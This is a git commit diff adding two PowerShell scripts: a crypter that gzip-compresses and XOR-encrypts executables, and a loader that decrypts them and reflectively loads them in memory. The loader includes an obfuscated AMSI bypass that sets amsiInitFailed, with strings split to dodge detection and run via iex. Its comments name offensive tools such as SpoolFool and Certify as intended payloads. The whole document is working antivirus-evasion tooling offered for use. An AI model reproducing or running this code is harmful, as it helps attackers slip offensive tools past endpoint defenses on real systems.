90debe111f20e3109d76b5ababac39bb98de5d72
Cheka <39255806+Argentix03@users.noreply.github.com>
2022-09-25 19:06:48 +0300

    Add files via upload

---
+++ PSCrypter.ps1
@@ -0,0 +1,67 @@
+﻿# Original file -> Gzip compress -> Xor encrypt
+Function Crypter {
+    param(
+         [Parameter()]
+         [string]$File
+    )
+
+    if (!($File)) {
+        $File = Read-Host "File path"
+    }
+
+    # Set up a compression stream (this took a looong while)
+    $byteArray = Get-Content $File -Encoding Byte
+    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+    $gzipStream.Write( $byteArray, 0, $byteArray.Length )
+    $gzipStream.Close()
+    $output.Close()
+    
+    # Xor encrypt the bytes
+    $tmp = $output.ToArray()
+    $encBytes = @();
+    $key = "white-hat"
+    for ($i = 0; $i -lt $tmp.Count; $i++) {
+        $encBytes += $tmp[$i] -bxor $key[$i % $key.Length];
+    }
+
+    # Write file to disk. Resulting file is a Xor encrypted GZip compressed file.
+    [IO.File]::WriteAllBytes("$file.gz.enc", $encBytes)
+    Write-Host -ForegroundColor Green "[+] Written encrypted file: $file.gz.enc"
+
+}
+
+# Xor decrypt -> GZip decompress -> Write to disk
+Function Decrypter {
+    param(
+         [Parameter()]
+         [string]$File
+    )
+
+    if (!($File)) {
+        $File = Read-Host "File path"
+    }
+
+    # Xor decrypt
+    $byteArray = Get-Content $File -Encoding Byte
+    $tmp = @();
+    $key = "white-hat"
+    for ($i = 0; $i -lt $byteArray.Count; $i++) {
+        $tmp += $byteArray[$i] -bxor $key[$i % $key.Length];
+    }
+
+    # Gzip decompress
+    $GUNZIP = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String([Convert]::ToBase64String($tmp)), [IO.Compression.CompressionMode]::Decompress)
+    $uncompressed = New-Object Byte[](17920) # (Statically) put the size of the ORIGINAL exe file (dunno how to make it dynamic here).
+    $GUNZIP.Read($uncompressed, 0, 17920) | Out-Null # Put the size of the ORIGINAL exe file.
+    [System.Reflection.Assembly]::Load($uncompressed)
+
+    # Write file to disk
+    if ($file.Contains(".gz.enc")) {
+        $filename = $File.Replace(".gz.enc", ".exe")
+    }
+    else {
+        $filename = $filename + ".exe"
+    }
+    [IO.File]::WriteAllBytes("$filename", $uncompressed)
+}
---
+++ PSLoader.ps1
@@ -0,0 +1,31 @@
+﻿# Xor decrypt -> GZip decompress -> Reflective load
+# AMSI scans buffer on load. Calls a bypass before load.
+Function Loader {
+    param(
+         [Parameter()]
+         [string]$File
+    )
+
+    if (!($File)) {
+        $File = Read-Host "Encrypted File path"
+    }
+
+    $byteArray = Get-Content $File -Encoding Byte
+    $tmp = @();
+    $key = "white-hat"
+    for ($i = 0; $i -lt $byteArray.Count; $i++) {
+        $tmp += $byteArray[$i] -bxor $key[$i % $key.Length];
+    }
+    $GUNZIP = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String([Convert]::ToBase64String($tmp)), [IO.Compression.CompressionMode]::Decompress)
+    $uncompressed = New-Object Byte[](17920) # (Statically) put the size of the ORIGINAL exe file (dunno how to make it dynamic here).
+    $GUNZIP.Read($uncompressed, 0, 17920) | Out-Null # Put the size of the ORIGINAL exe file.
+    Bypasser
+    [System.Reflection.Assembly]::Load($uncompressed)
+    [SpoolFool.Program]::CommandEntry($args) # [Namespace.Class]::Function(args) Examples: [C3rt1fy.Program]::main(@(arg1, arg2)) , [R8b38s.Program]::Main($Command.Split(" "))
+}
+
+Function Bypasser {
+    $a = [Ref].Assembly.GetType('System.Management.Automation.Am'+'s'+'iU'+'tils')
+    $b = $a.GetField('ams'+'iIn'+'itFa'+'iled','NonPu'+'blic,St'+'atic')
+    iex('$b.Se'+'tVa'+'lue($null,$true)')
+}
